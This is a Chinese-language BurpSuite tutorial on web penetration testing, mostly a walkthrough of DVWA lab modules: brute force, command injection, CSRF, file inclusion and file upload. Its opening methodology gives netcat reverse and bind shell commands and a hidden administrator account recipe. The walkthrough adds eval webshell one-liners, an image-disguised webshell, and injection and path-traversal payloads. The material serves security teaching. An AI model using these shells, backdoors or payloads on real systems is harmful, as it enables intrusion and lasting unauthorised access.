@@ -1,0 +1,1084 @@
+---
+title: "BurpSuite实战教程01-web渗透安全测试(靶场搭建及常见漏洞攻防)"
+date: 2025-09-18T16:55:17+08:00
+# bookComments: false
+# bookSearchExclude: false
+---
+
+# 渗透测试
+渗透测试（Penetration test）即安全工程师模拟黑客，在合法授权范围内，通过信息搜集、漏洞挖掘、权限提升等行为，对目标对象进行安全测试（或攻击），最终找出安全风险并输出测试报告。
+
+Web渗透测试分为白盒测试和黑盒测试，白盒测试是指目标网站的源码等信息的情况下对其渗透，相当于代码分析审计。而黑盒测试则是在对该网站系统信息不知情的情况下渗透。
+
+Web渗透分为以下几个步骤，信息收集，漏洞扫描，漏洞利用，提权，内网渗透，留后门，清理痕迹。一般的渗透思路就是看是否有注入漏洞，然后注入得到后台管理员账号密码，登录后台，上传小马，再通过小马上传大马，提权，内网转发，进行内网渗透，扫描内网c段存活主机及开放端口，看其主机有无可利用漏洞（nessus）端口（nmap）对应服务及可能存在的漏洞，对其利用（msf）拿下内网，留下后门，清理痕迹。或者看是否有上传文件的地方，上传一句话木马，再用菜刀链接，拿到数据库并可执行cmd命令，可继续上大马.........思路很多，很多时候成不成功可能就是一个思路的问题，技术可以不高，思路一定得骚。
+
+## 信息收集
+息收集是整个流程的重中之重，前期信息收集的越多，Web渗透的成功率就越高。
+- DNS域名信息：通过url获取其真实ip,子域名(Layer子域名爆破机)，旁站(K8旁站，御剑1.5)，c段，网站负责人及其信息（whois查询）
+- 整站信息：服务器操作系统、服务器类型及版本(Apache/Nginx/Tomcat/IIS)、数据库类型(Mysql/Oracle/Accees/Mqlserver)、脚本类型(php/jsp/asp/aspx)、CMS类型；
+网站常见搭配为：
+1. ASP和ASPX：ACCESS、SQLServer
+2. PHP：MySQL、PostgreSQL
+3. JSP：Oracle、MySQL
+- 敏感目录信息（御剑，dirbust）
+- 开放端口信息（nmp）
+## 漏洞扫描
+利用AWVS,AppScan,OWASP-ZAP，BurpSuite等可对网站进行网站漏洞的初步扫描，看其是否有可利用漏洞。
+常见漏洞：
+- SQL注入
+- XSS跨站脚本
+- CSRF跨站请求伪造
+- XXE(XML外部实体注入)漏洞
+- SSRF(服务端请求伪造)漏洞
+- 文件包含漏洞
+- 文件上传漏洞
+- 文件解析漏洞
+- 远程代码执行漏洞
+- CORS跨域资源共享漏洞
+- 越权访问漏洞
+- 目录遍历漏洞和任意文件读取/下载漏洞
+## 漏洞利用
+用工具也好什么也好对相应漏洞进行利用
+如：
+Sql注入（sqlmap）
+XSS（BEEF）
+后台密码爆破（burp）
+端口爆破（hydra）
+## 提权
+获得shell之后我们权限可能很低，因此要对自己提权，可以根据服务器版本对应的exp进行提权，对于Windows系统也可看其补丁对应漏洞的exp进行提权
+## 内网渗透
+首先进行端口转发可用nc
+nc使用方法：
+反向连接
+在公网主机上进行监听：
+nc-lvp 4444
+在内网主机上执行：
+nc-e cmd.exe 公网主机ip4444
+成功之后即可得到一个内网主机shell
+正向连接
+远程主机上执行：
+nc-l -p 4444 -t -e cmd.exe
+本地主机上执行：
+nc-vv 远程主机ip4444
+成功后，本地主机即可远程主机的一个shell
+然后就是对内网进行渗透了，可以用主机漏洞扫描工具（nessus,x-scan等）进行扫描看是否有可用漏洞，可用msf进行利用，或者用nmap扫描存活主机及开放端口，可用hydra进行端口爆破或者用msf对端口对应漏洞得到shell拿下内网留后门
+## 留后门
+对于网站上传一句话木马，留下后门
+对于windows用户可用hideadmin创建一个超级隐藏账户
+手工：
+netuser test$ 123456 /add
+netlocalgroup administrators test$ /add
+这样的话在cmd命令中看不到，但在控制面板可以看到，还需要改注册表才能实现控制版面也看不到。
+# 安全防护关键词
+## WAF
+Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。
+## RASP
+“Runtime application self-protection”一词，简称为RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。
+
+RASP技术可以快速的将安全防御功能整合到正在运行的应用程序中，它拦截从应用程序到系统的所有调用，确保它们是安全的，并直接在应用程序内验证数据请求。Web和非Web应用程序都可以通过RASP进行保护。该技术不会影响应用程序的设计，因为RASP的检测和保护功能是在应用程序运行的系统上运行的。
+## IAST/SAST/DAST
+交互式应用程序安全测试（Interactive Application Security Testing），是白盒测试(SAST)，黑盒测试(DAST)结合优点而成的灰盒测试,IAST的插桩技术在java里就是开始一个agent发现有漏洞的执行就报告，比如sql注入，依赖java包的版本检测等。.
+在安全测试中都会遇到SAST(Static Application Security Testing )、DAST(Dynamic Application Security Testing )、IAST(Interactive Application Security Testing )的概念.
+| 比较项         | SAST             | DAST             | IAST             |
+| ---------------- | ------------------ | ------------------ | ------------------ |
+| 扫描对象       | 源代码           | 运行时的应用程序 | 运行时的应用程序 |
+| 扫描准备       | 简单             | 复杂             | 复杂             |
+| 扫描速度       | 快               | 很慢             | 慢               |
+| 误报率         | 高               | 低               | 低               |
+| 覆盖率         | 高               | 低               | 中               |
+| 对环境的影响   | 无               | 有               | 有               |
+| 测试方法       | 白盒             | 黑盒             | 黑盒             |
+| 与开发语言关系 | 有关             | 无关             | 有关             |
+| CI/CD集成      | 支持             | 不支持           | 不支持           |
+| 支持测试阶段   | 研发、测试、上线 | 测试、上线       | 测试、上线       |
+| 部署           | 简单             | 简单             | 复杂             |
+
+# 靶场实践
+## 靶场推荐
+如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它,很多这种开源的项目都可以重现这些漏洞，这些项目被称为：靶场
+靶场推荐（半年内有维护的）：
+1. [DVWA](https://github.com/digininja/DVWA/blob/master/README.zh.md)：Damn Vulnerable Web Application (DVWA)(译注：可以直译为："该死的"不安全Web应用程序)，是一个编码差的、易受攻击的 PHP/MySQL Web应用程序。 它的主要目的是帮助信息安全专业人员在合法的环境中，练习技能和测试工具，帮助 Web 开发人员更好地了解如何加强 Web 应用程序的安全性，并帮助学生和教师在可控的教学环境中了解和学习 Web 安全技术。
+2. [pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)：Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。
+3. [WebGoat](https://github.com/WebGoat/WebGoat):java靶场,WebGoat 是由 OWASP 维护的一个故意不安全的 Web 应用程序，旨在教授 Web 应用程序安全性课程。
+4. [vulstudy](https://github.com/c0ny1/vulstudy):vulstudy是专门收集当下流行的漏洞学习平台，并将其制作成docker镜像,包含dvwa和pikachu等10几块靶场
+5. [javaweb-vuln](https://github.com/javaweb-rasp/javaweb-vuln):这是一个用于测试RASP/IAST的Java靶场，包含了非常多的漏洞类型，该靶场由多个模块组成，示例程序基本上都在vuln-core项目中有详尽的分类，测试过程中如遇到问题请及时反馈，非常感谢！
+6. [github搜索](https://github.com/search?q=%E9%9D%B6%E5%9C%BA) github上靶场列表。
+
+## 靶场（dvwa）安装
+安装php集成环境：wamp，使用phpstorm开启调试环境（方便分析源代码），参考文档：https://blog.csdn.net/liaomin416100569/article/details/128100034?spm=1001.2014.3001.5501
+
+下载dvwa到wamp的www目录
+```
+git clone https://github.com/digininja/DVWA.git
+```
+DVWA 附带了一个示例配置文件，需要根据实际环境复制一份该文件并修改。 比如在 Linux 环境的 DVWA 路径下， 可以直接执行命令:
+```
+cp config/config.inc.php.dist config/config.inc.php
+```
+修改数据库相关配置：./config/config.inc.php
+```
+$_DVWA[ 'db_server'] = '127.0.0.1';
+$_DVWA[ 'db_port'] = '3306';
+$_DVWA[ 'db_user' ] = 'dvwa';
+$_DVWA[ 'db_password' ] = '';
+$_DVWA[ 'db_database' ] = 'dvwa';
+```
+访问http://localhost/DVWA
+> 我这个页面是操作修改过php.ini的
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9a2a3aa88e5d916f61656114c0142f04.png)
+
+修改php.ini文件,确保以下参数和下面所列相同
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/19202d85b7e4c449ff6c89c6433e625e.png)
+- allow_url_include = On - 允许包含远程文件 (RFI) [启用url-include]
+- allow_url_fopen = On - 允许远程访问（就是请求http） (RFI) [启用url-fopen]
+- safe_mode = Off - (如果 PHP 版本 <= v5.4) 允许SQL注入 (SQLi) [安全模式]
+- magic_quotes_gpc = Off - (如果 PHP 版本 <= v5.4) 允许SQL注入 (SQLi) [魔术引号]
+- display_errors = Off - (可选) 不显示PHP警告消息 [关闭错误显示]
+
+config/config.inc.php 文件配置:
+```
+$_DVWA[ 'recaptcha_public_key' ] & $_DVWA[ 'recaptcha_private_key' ] - 这里的值可以在此网址生成: https://www.google.com/recaptcha/admin/create  需要翻墙，这个秘钥是Insecure CAPTCHA漏洞用来生成验证码图片的秘钥，需要自己去申请创建一个
+```
+可以直接用这个
+
+点击按钮 Create/Reset Database
+连接数据库查看就生成两个表user和guestbook
+## 漏洞模块测试
+DVWA共有十四个模块，分别是：
+- Brute Force（暴力破解）
+- Command Injection（命令行注入）
+- CSRF（跨站请求伪造）
+- File Inclusion（文件包含）
+- File Upload（文件上传）
+- Insecure CAPTCHA （不安全的验证码）
+- SQL Injection（SQL注入）
+- SQL Injection（Blind）（SQL盲注）
+- Weak Session IDs （弱会话ID）
+- XSS (DOM) （DOM型跨站脚本）
+- XSS（Reflected）（反射型跨站脚本）
+- XSS（Stored）（存储型跨站脚本）
+- CSP Bypass （CSP绕过）
+- JavaScript
+
+dvwa每个漏洞都有三个难度Low、Media、High，都可以使用各种方式攻破的。
+可通过DVWA Security 设置难度
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/8bf5d74085548f584f7b6e461a2bf8c8.png)
+通过phpstorm查看对应攻击的源代码，分析他的逻辑
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/7551eba74d19d7db4691f9c001e7cbcf.png)
+### 使用软件
+- SwitchyOmega：chrome浏览器设置代理的插件。
+- BurpSuite ：用来抓包，漏洞重放等，进行web网站扫描。
+- sqlmap：SQLMap 是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL 、Oracle 、PostgreSQL 、Microsoft SQL Server、Microsoft Access 、IBM DB2, SQ Lite 、Firebird 、Sybase和SAPMaxDB 。
+- 中国蚁剑：[中国蚁剑](https://github.com/AntSwordProject/antSword/blob/master/README_CN.md)是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，只要网站上传一句话木马，即可连接到web服务器。
+php：<?php @eval($_post['ant']);?>
+asp：<%eval request ("ant")%>
+aspx：<%@ Page Language="Jscript"%> <%eval(Request.Item["ant"],"unsafe");%>
+
+### Brute Force（暴力破解）
+暴力破解，又叫撞库、穷举，使用大量的字典逐个在认证接口尝试登录，理论上，只要字典足够强大，破解总是会成功的。
+阻止暴力破解的最有效方式是设置复杂度高的密码（英文字母大小写、数字、符号混合）。
+
+而如果你的字典是从某网站泄露出来的，你使用它试图登陆其他网站，就便是撞库。撞库攻击的成功率高于暴力破解，因为你在A网站的用户名、密码通常和B网站的用户名、密码一致。
+
+常用的开源的弱用户名密码字典有：
+https://github.com/fuzz-security/SuperWordlist
+https://github.com/NS-Sp4ce/Dict
+https://github.com/mysticbinary/weakpass
+
+#### Low
+查看low代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/181bd3a40e66de627ac0a1f47be3ab1f.png)
+打开Burp Suite proxy面板，options打开8080端口，默认是开的
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/808028b448d1193fd692d10d1274081e.png)
+浏览器SwitchyOmega新增个代理
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/42d99f4322d68efebae42a12843a5c08.png)
+因为switchyomega 不会拦截localhost  127.0.0.1这样的ip，所以用你的局域网ip访问,
+比如我的是：http://192.168.20.48/DVWA
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/fd2610dba1a00f5025d4109d7ad3912f.png)
+访问地址后，网站后选择代理，在burp中进入proxy-intercept点击intercept is on,点击登录按钮发现http请求被拦截。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/cbd91509234332927b64e926f6f93640.png)
+点击action->send to intruder 可以先关闭intercept is off,点击Intruder（用于爆破）页面看到刚刚的请求
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/207cd73240aca2e0f642c10d160f7b2c.png)
+默认burp加了一堆了占位符，可以理解这些占位符后续可以用字典替换后，不能的调用
+attach type的作用如下：
+-Sinper（狙击手）：狙击手模式使用一组payload集合，它一次只使用一个payload位置，假设你标记了两个位置“A”和“B”，payload值为“1”和“2”，那么它攻击会形成以下组合（除原始数据外）：
+| attack NO. | location A | location B |
+| ------------ | ------------ | ------------ |
+| 1          | 1          | no replace |
+| 2          | 2          | no replace |
+| 3          | no replace | 1          |
+| 4          | no replace | 2          |
+
+- Battering ram（攻城锤模式）:攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。
+
+| attack NO. | location A | location B |
+| ------------ | ------------ | ------------ |
+| 1          | 1          | 1          |
+| 2          | 2          | 2          |
+- Pitchfork（草叉模式）:草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，则攻击模式如下：
+
+| attack NO. | location A | location B |
+| ------------ | ------------ | ------------ |
+| 1          | 1          | 3          |
+| 2          | 2          | 4          |
+- Cluster bomb（集束炸弹模式）:集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除baseline请求外，会有四次请求：
+
+| attack NO. | location A | location B |
+| ------------ | ------------ | ------------ |
+| 1          | 1          | 3          |
+| 2          | 1          | 4          |
+| 3          | 2          | 3          |
+| 4          | 2          | 4          |
+
+我们清除掉所有站位符号，然后选中用户名和密码的地方加上占位符，选择Cluster bomb
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d336c08b81b1d3ffe799fb1ef8a6fcba.png)
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/2055d1d7ebf0bef076879af08a693bc1.png)
+
+进入payloads页面，注意cluster bomb类型有几个占位符 就有几组payload需要设置，为了简单测试
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0846cd25f6f307c2b734b9244a493596.gif)
+可以看到成功的admin/password的length不一样
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e3cb0c042964369330b4b4155d7d1897.png)
+字典文件也可以从之前提供gitlab上下载下来然后通过load去加载出来
+其中resource pool面板可以定义并发的线程数，
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e04af0adaa0865f3a38c96cf1d88d58b.png)
+#### Medium
+看代码
+1. 用户名和密码添加了mysqli_real_escape_string函数转义sql参数的特殊字符，防止sql注入
+2. 密码错误后，会休眠2s才返回。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/259c5677e1bc3a387fedf852133c0e4e.png)
+low中的脚本依然可以执行，只是10个线程访问，的时间变化了，出错了就2s才能试下一组密码。
+
+#### Hign
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/f3343287098aca6f1631b872acbfff62.png)
+这里主要是在页面访问时session中产生了一个token放在表单的hidden中，提交表单时，带上来，校验，主要是方式不经过页面的请求。
+破解的做法是从 页面的input[name=user_token]中拿到value值就可以了
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/854580b003ff5bc765cd3738ca8bbf3b.png)
+抓包 多了一个user_token的占位符，如果直接抓包请求会出现302重定向到登录页面
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/8773aee922e3d5514da7ae22ad4f2179.png)
+因为token是每次访问页面时销毁上一个，生成下一个，所以需要在访问页面产生一个新的，然后获取这个新的token，验证用户名和密码时带上这个新的token，token失效。
+##### Recursive grep方式
+就是从上一次请求抓取到user_token作为下一次请求的参数，所以第一次是验证是无效的当然也可以设置第一次的payload。
+将username和password和user_token设置三个占位符，请求设置为pitchfork，不能再用bomb（因为bomb的第三个参数user_token每次都是新的所以请求是笛卡尔积是死循环）
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/59c58f9ebe6f9b2597fedfa6d24082f0.png)
+因为pitchfork 通过索引号1对1所以简单设置两对,第一对设置个随意值
+default --------------  default
+admin ----------------password
+test    ---------------- 123456
+注意将options里面的redirecctions设置为always，因为验证不通过，会响应一个302跳转到index.php
+这个配置是自动在发一次请求重定向到index.php，就能拿到token了
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e48dc5cff83a94ec719128ad3c892b50.png)
+因为这个我们请求用的同一个session_id为了防止并行互相删除对方的user_token，新增一个resourcepool
+修改为1个线程请求。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/81de6a5add6cd6eb7f69f86659425bb1.png)
+设置Grep Extract![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/30834c1958e41e5dd07bb4bcd9b4f398.gif)
+查看执行结果
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0caa1449f86a1f2d2ece31f259996306.png)
+
+
+
+
+##### Project Option的Session方式
+通过访问某个页面，抓取到user_token后替换参数后请求
+点击projects option，进入sessions面板
+新建一个宏（宏就是从哪个页面中怎么样抓取某个数据）
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/591ef942aa86641c289bbe083276c21b.gif)
+注意define custom parameter页面的参数名和请求参数名一致
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/fbe6bbe5b0e98298fbafe4ceecd91c9b.png)
+
+点击添加一个session handing rules,将运行的宏添加到handler中，并且将宏获取的值更新到参数user_token中，同时在score中指定这个session handler只是在请求你的dvwa网站地址才生效，勾选这个handler
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/58857ab4bd7bed3fac77096f19295089.gif)
+因为这个我们请求用的同一个session_id为了防止并行互相删除对方的user_token，新增一个resourcepool
+修改为1个线程请求。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/81de6a5add6cd6eb7f69f86659425bb1.png)
+请求结果爆破：
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d07479e1206962162ece9ce573894e94.png)
+#### impossible
+使用prepare编译sql，解决了sql注入问题，失败三次，锁定15分钟，解决爆破问题。
+
+### Command Injection（命令行注入）
+命令注入，是指在某些需要输入数据的位置，构造恶意代码破环原有的语句结构，而系统缺少有效的过滤，许多内容管理cms存在命令注入漏洞。
+#### Low
+exec目录下看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/29eb2976f23162bd8365f090578497f5.png)
+因为拼接字符串，直接输入ip 在 && ipconfig 就可以直接执行
+> 注意设置安全级别
+
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/01d143962f517fa1e9683866b78632c9.png)
+命令连接执行常用的方式：
+- &          之后的命令无论如何都会被执行。
+- &&        之后的命令只有在前&&之前的命令执行成功才会被执行。
+- |          永远只执行最后一个。
+- ||        只要一个成功执行就，停止执行
+> 注意 echo 0 && ipconfig 也可以连接符左右不要空格 echo 0&&ipconfig
+
+#### Medium
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0adf9c8d0cde5fb9a0b8169c9716d4cd.png)
+将输入参数的值中的&&和;替换成空，用|直接，输入8.8.8.8|ipconfig
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/21be98edbb1d7b53205ba2a15e0669d0.png)
+#### Hign
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9f90ef84b93c6cba2a9aff90e803409b.png)
+用medium中的8.8.8.8|ipconfig一样过。
+
+#### impossible
+将ip分成4个区域（.拆分），判断每个区域都是数字，彻底无解
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/6a9f760afe537a964144389a2d15098f.png)
+### CSRF（跨站请求伪造）
+一种可以被攻击者用来通过用户浏览器冒充用户身份向服务器发送伪造请求并被目标服务器成功执行的漏洞被称之为CSRF漏洞。
+特点：
+- 用户浏览器：表示的受信任的用户
+- 冒充身份：恶意程序冒充受信任用户（浏览器）身份
+- 伪造请求：借助于受信任用户浏览器发起的访问
+
+由于CSRF攻击的特殊性，还是以钓鱼和源码解析为主好了。
+场景：比如某个购物网站，你登录了或者长期免登录，同时在同一个浏览器的tab页签打开了某个钓鱼
+网站，钓鱼网站在他的网页中执行购物网站的接口拿到购物网站的订单和个人信息等，网站安全性差的情况下直接调用提现，同时也可以实施电话诈骗了，。
+
+#### Low
+上代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/8d11cd70c355f926b650bf1d98baa75a.png)
+页面功能是输入密码和确认密码通过get方式提交了请求
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9f7d67e56a5cd3c67e559969158c50c6.png)
+如果网站开启了cors，一般其他域名无法直接调用这个域名对应的接口，只能通过csrf伪装（创建另外一个网站在同一个chrome用攻击网站的token来发起请求）
+抓包并发送到repeater
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d9587af043bb10889ee1b5bc678bc224.png)
+进入repeater中右键Engagementtools -》Generate CSRF PoC
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ce0b264c657cd2143b46cc91cbf2222d.png)
+将生成的html放到的你的钓鱼网站可以访问
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d4ff9113acf43f72f8cedec4488b5a8b.png)
+点击该窗口的Test in browser然后复制打开浏览器（注意和修改密码同一个浏览器），设置为通过代理访问
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d14965af7e4ffea5be95e0c1318f471d.png)
+点击submit request修改密码成功
+
+#### Medium
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/41b59abcc633fb71d54998ba925dfb3f.png)
+正常访问HTTP_REFERER是：http://192.168.20.48//DVWA/vulnerabilities/csrf/
+SERVER_NAME是：192.168.20.48
+如果我直接通过：http://burpsuite/show/6/dxfgg2g0oa22anhtx8qv7bei6bunumxn
+HTTP_REFERER就不包含192.168.20.48，我们是不是可以在页面定义为
+http://burpsuite/show/6/dxfgg2g0oa22anhtx8qv7bei6bunumxn/192.168.20.48访问这个csrf页面就可以越过了，挂个nginx做个location就解决。
+
+
+#### Hign
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ec948416eebc97ce17badb72cabffb50.png)
+修了post请求方式，先验证token是否存在，再验证token值是否正确。要绕过High级别的反CSRF机制，关键是要获取用户当前token。
+破解方式：
+自己写一个网页，直接ajax请求登录页，通过dom解析获取到user_token，然后ajax post请求提交，直接绕过。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/278cd315cc250153a062db973c4b4109.png)
+#### impossible
+添加了旧密码和新密码，数据库参数化（防注入），无法破解。
+### File Inclusion（文件包含）
+程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。
+文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他非预期文件，导致了文件信息泄露或执行非预期代码。
+#### Low
+看效果，在这个页面li/index.php包含了 file1.php,file2.php,file3.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/015afe448e48090081cef336c75d8030.png)
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/21bc1d88d5f1b5a59a7957c6989df6cb.png)
+根据安全类型包含对应的[安全类型].php,被包含文件中定义被包含的页面变量$file
+low.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/1cd8566b91dbabc0939ecf851deeff53.png)
+接下来换成读取php.ini :http://192.168.20.48/DVWA/vulnerabilities/fi/?page=../../php.ini
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e6f6465ddd8475243b97174a811c45ef.png)
+phpinfo.php：http://192.168.20.48/DVWA/vulnerabilities/fi/?page=../../phpinfo.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/4255bea2c1667b3ef2a8c08d668c42ae.png)
+直接路径包含其他项目的文件：http://192.168.20.48/DVWA/vulnerabilities/fi/?page=D:\green\wamp\www\helloworld\if.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/53544f55a771bb9643db01f47c9b2716.png)
+权限够的包含linux下的/etc/passwd等
+window下： http://192.168.20.48/DVWA/vulnerabilities/fi/?page=C:\Windows\System32\drivers\etc\hosts
+
+访问其他网站:http://192.168.20.48/DVWA/vulnerabilities/fi/?page=https://www.baidu.com
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9b8ba8047e55300ce75675ca2c62eed1.png)
+
+
+#### Medium
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/3697a01bd5250bfc753eff7a028fd669.png)
+将https://,https://和../开头的屏蔽掉了，但是绝对路径的依然可访问
+如：http://192.168.20.48/DVWA/vulnerabilities/fi/?page=D:\green\wamp\www\helloworld\if.php
+
+#### Hign
+看代码
+
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/a3c3c8fb984cd7f3e5b18358aaae35c7.png)
+匹配$file必须为file开头的字符串且不是include.php
+因为只匹配了开头，那么file协议刚刚好满足此条件
+http://192.168.20.48/DVWA/vulnerabilities/fi/?page=file:///D:\green\wamp\www\helloworld\if.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ad8303c0b3f30b787b1f08bd74148cf9.png)
+#### impossible
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/5532efc5e2e5bdb4896b767b61fa22d0.png)
+写死了，只能是include.phpp file1-3.php,除非通过之前的命令行注入修改这几个包含文件的内容否则就无解了。
+
+这里测试的include.php中包含的file3.php存在xss漏洞
+http://192.168.20.48/DVWA/vulnerabilities/fi/?page=file3.php
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/76a0028c28408ff27aef1ff2477ac632.png)
+
+### File Upload（文件上传）
+File Upload，即文件上传漏洞，指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限。
+#### Low
+查看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/c63243afd5c9aa48fa1f124b6565abb0.png)
+直接将文件传输上传到hackable/upload/目录，未做任何限制
+安装中国蚁剑（参考：https://www.yuque.com/antswordproject/antsword/srruro）
+>出现代码解压出错：[object Object]，可以再次管理员身份运行即可安装好，安装后再次打开即可用。
+添加一个shell文件(https://www.yuque.com/antswordproject/antsword/qg3g73)
+ant.php 内容：（注意ant参数蚁键里是密码）
+```
+<?php eval($_POST['ant']); ?>
+```
+通过功能上传
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/1a9c9ccba0a6889824adae8cf6649890.png)
+通过中国蚁剑管理
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/c33373dc227e3538ec2c95a2cb6b8b6c.gif)
+可以右键打开终端执行任何系统命令
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/44623486c12136782fce28109563b0cb.gif)
+#### Medium
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/1477d13daa8cb41af21eaa6bc0f75e7a.png)
+直接上传
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/1401a5693298a7910790b119a78f31a8.png)
+
+直接抓包，action到repeater，通过修改multipart/data中的content-type就可以绕过了。
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/a6258ff3df85ae1ef7f3c0af86a5e34c.gif)
+#### Hign
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/527570eb20708aba1075e878f450376f.png)
+
+判断上传文件的后缀名是jpg|jpeg|png,同时根据getimagesize函数判断文件内容的前几个字符
+所以将php文件修改为jpg结尾的文件是无法上传成功的，除非文件中包含图片的标识
+有兴趣可研究：https://www.php.net/manual/en/function.getimagesize.php
+制作一个图片包含文件内容即可（图片马）
+随便用画图工具画个很小的图片文件。
+执行命令：copy zero.png/b+ant.php/a shell.png
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/f16eaca051784e1193cc5a4b99ce658c.png)
+将生成的shell.png上传，上传成功
+或者在php一句话木马中添加gif等图片的标志即可
+
+```
+GIF89a
+<?php eval($_POST['ant']); ?>
+```
+因为图片文件在访问时直接当图片处理无法解析jpg中的php一句话木马。
+所有需要用之前的hign对应的包含漏洞
+http://192.168.20.48/DVWA/vulnerabilities/fi/?page=file:///D:\green\wamp\www\DVWA\hackable\uploads\shell.png
+
